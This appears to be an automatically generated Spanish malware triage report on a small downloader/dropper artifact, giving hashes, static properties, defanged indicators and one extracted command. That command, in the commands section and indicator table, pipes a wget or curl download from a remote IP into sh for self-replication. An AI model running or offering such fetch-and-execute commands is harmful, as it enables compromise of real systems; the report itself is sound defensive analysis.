# 🧬 Payload Analysis

`8780dafd994e32edbcbef738b587ca9bc6f71d82f217e7bc172aa0b7cd5da9b1`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8780dafd994e32edbcbef738b587ca9bc6f71d82f217e7bc172aa0b7cd5da9b1`
- **SHA1:** `bc2f60605324475befc5fe88aedc3cdc2531daa4`
- **MD5:** `66c0efae4756e5a53a38bccfaabc5c5d`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 368 B |
| Entropía | 5.13 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrep
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 14.46.136.XXX | static_analysis |
| ip | 190.179.177.XXX | static_analysis |
| url | hxxps://14.46.136.XXX/sh | strings |
| url | hxxps://14.46.136.XXX/sh) | strings |
| hash | 8780dafd994e32edbcbef738b587ca9bc6f71d82f217e7bc172aa0b7cd5da9b1 | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrep | strings |
| ip | 194.164.193.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
